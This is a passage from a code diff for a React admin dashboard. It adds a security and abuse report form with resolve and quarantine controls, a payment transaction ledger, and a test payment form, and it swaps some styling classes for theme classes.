+                SECURITY, MALWARE &amp; ABUSE REPORTING (`security_reports`)
+              </div>
+              <form onSubmit={handleCreateReport} className="space-y-2">
+                <div className="grid grid-cols-2 gap-2">
+                  <input
+                    type="text"
+                    value={newReportTarget}
+                    onChange={(e) => setNewReportTarget(e.target.value)}
+                    placeholder="Target App / IP / Endpoint"
+                    className="rounded-xl px-3 py-1.5 text-xs font-mono-num theme-input"
+                  />
+                  <input
+                    type="text"
+                    value={newReportCategory}
+                    onChange={(e) => setNewReportCategory(e.target.value)}
+                    placeholder="Category"
+                    className="rounded-xl px-3 py-1.5 text-xs theme-input"
+                  />
+                </div>
+                <div className="flex gap-2">
+                  <input
+                    type="text"
+                    required
+                    value={newReportDesc}
+                    onChange={(e) => setNewReportDesc(e.target.value)}
+                    placeholder="Describe suspicious behavior, XSS vector, or malware indicator..."
+                    className="flex-1 rounded-xl px-3 py-1.5 text-xs theme-input"
+                  />
+                  <button
+                    type="submit"
+                    className="rounded-xl bg-indigo-600 hover:bg-indigo-500 px-4 py-1.5 text-xs font-bold text-white cursor-pointer"
+                  >
+                    Submit Report
+                  </button>
+                </div>
+              </form>
+
+              <div className="space-y-2 max-h-72 overflow-y-auto pr-1">
+                {resolvedReports.map((rep) => (
+                  <div key={rep.id} className="rounded-2xl p-3 theme-subtle space-y-1 text-xs">
+                    <div className="flex items-center justify-between gap-2">
+                      <span className="font-bold text-indigo-400">{rep.category} • {rep.target_id}</span>
+                      <span className="rounded-md bg-emerald-500/15 px-2 py-0.5 font-mono-num text-[10px] font-bold text-emerald-400">
+                        {rep.status}
+                      </span>
+                    </div>
+                    <p className="text-[11px] theme-text-muted">{rep.description}</p>
+                    <div className="flex items-center justify-between pt-1">
+                      <span className="font-mono-num text-[10px] text-slate-400">
+                        By {rep.reporter_name} ({rep.reporter_role})
+                      </span>
+                      {rep.status === 'OPEN' && (
+                        <div className="flex gap-1.5">
+                          <button
+                            type="button"
+                            onClick={() => handleResolveReport(rep.id, 'RESOLVED')}
+                            className="rounded bg-emerald-500/20 px-2 py-0.5 font-mono-num text-[10px] font-bold text-emerald-300 cursor-pointer"
+                          >
+                            Resolve
+                          </button>
+                          <button
+                            type="button"
+                            onClick={() => handleResolveReport(rep.id, 'QUARANTINED')}
+                            className="rounded bg-rose-500/20 px-2 py-0.5 font-mono-num text-[10px] font-bold text-rose-300 cursor-pointer"
+                          >
+                            Quarantine
+                          </button>
+                        </div>
+                      )}
+                    </div>
+                  </div>
+                ))}
+              </div>
+            </div>
+          </div>
+        </div>
+      )}
+
+      {/* 8. Real-Time Payment Gateway & Cryptographic Settlement Ledger */}
+      {adminSection === 'payments' && (
+        <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
+          <div className="lg:col-span-8 rounded-3xl p-5 theme-card space-y-3">
+            <div className="font-mono-num text-[10px] font-bold uppercase text-emerald-400">
+              REAL-TIME CRYPTOGRAPHIC PAYMENT LEDGER (`payment_transactions`)
+            </div>
+            <div className="space-y-2.5 max-h-96 overflow-y-auto pr-1">
+              {resolvedPayments.map((pay) => (
+                <div key={pay.id} className="rounded-2xl p-3.5 theme-subtle flex flex-wrap items-center justify-between gap-3 text-xs">
+                  <div>
+                    <div className="flex items-center gap-2">
+                      <span className="font-mono-num font-bold text-emerald-400">{pay.auth_code}</span>
+                      <span className="font-bold">{pay.customer_name}</span>
+                      <span className="font-mono-num text-[11px] text-indigo-400">Order #{pay.order_number}</span>
+                    </div>
+                    <div className="text-[11px] theme-text-muted mt-0.5">
+                      {pay.payment_method} • {pay.provider}
+                    </div>
+                    <div className="font-mono-num text-[10px] text-cyan-400 truncate max-w-md">
+                      Receipt: {pay.receipt_hash}
+                    </div>
+                  </div>
+                  <div className="text-right font-mono-num">
+                    <div className="text-base font-bold text-emerald-400">
+                      {formatPrice(pay.amount, currency)}
+                    </div>
+                    <span className="rounded bg-emerald-500/20 px-2 py-0.5 text-[10px] font-bold text-emerald-300">
+                      {pay.status}
+                    </span>
+                  </div>
+                </div>
+              ))}
+            </div>
+          </div>
+
+          <form onSubmit={handleProcessTestPayment} className="lg:col-span-4 rounded-3xl p-5 theme-card space-y-3 h-fit">
+            <div className="font-mono-num text-[10px] font-bold uppercase text-cyan-400">
+              LIVE PAYMENT GATEWAY ENDPOINT (POST /api/payments/process)
+            </div>
+            <h3 className="font-display text-base font-bold">
+              Authorize &amp; Settle Instant Payment
+            </h3>
+            <input
+              type="text"
+              required
+              value={testPayCustomer}
+              onChange={(e) => setTestPayCustomer(e.target.value)}
+              placeholder="Customer Name"
+              className="w-full rounded-xl px-3 py-2 text-xs theme-input"
+            />
+            <input
+              type="number"
+              required
+              min="1"
+              value={testPayAmount}
+              onChange={(e) => setTestPayAmount(e.target.value)}
+              placeholder="Amount (USD)"
+              className="w-full rounded-xl px-3 py-2 text-xs font-mono-num theme-input"
+            />
+            <select
+              value={testPayMethod}
+              onChange={(e) => setTestPayMethod(e.target.value)}
+              className="w-full rounded-xl px-3 py-2 text-xs theme-input"
+            >
+              <option value="Stripe Card •••• 4242">Stripe Card •••• 4242</option>
+              <option value="M-Pesa Express STK (+254 712 ••• 890)">M-Pesa Express STK (+254)</option>
+              <option value="Apple Pay • Biometric Passkey">Apple Pay • Biometric Passkey</option>
+              <option value="USDC Web3 Instant Settlement">USDC Web3 Instant Settlement</option>
+            </select>
+            <button
+              type="submit"
+              className="w-full rounded-2xl bg-emerald-500 hover:bg-emerald-400 py-2.5 text-xs font-extrabold text-slate-950 cursor-pointer"
+            >
+              Authorize &amp; Settle Payment Now
+            </button>
+          </form>
+        </div>
+      )}
+
       {/* Launch New Hardware Product Modal */}
       {showNewProductModal && (
         <div
           onClick={() => setShowNewProductModal(false)}
-          className="fixed inset-0 z-50 flex items-center justify-center bg-slate-950/80 backdrop-blur-sm p-4"
+          className="fixed inset-0 z-50 flex items-center justify-center theme-modal-backdrop p-4"
         >
           <form
             onClick={(e) => e.stopPropagation()}
             onSubmit={handleCreateProductSubmit}
-            className={`w-full max-w-lg rounded-3xl border p-6 space-y-4 shadow-2xl ${
-              darkMode
-                ? 'border-white/[0.1] bg-slate-900 text-slate-100'
-                : 'border-slate-200 bg-white text-slate-900'
-            }`}
+            className="w-full max-w-lg rounded-3xl border p-6 space-y-4 shadow-2xl theme-modal-panel theme-card"
           >
             <div
               className={`flex items-center justify-between border-b pb-3 ${
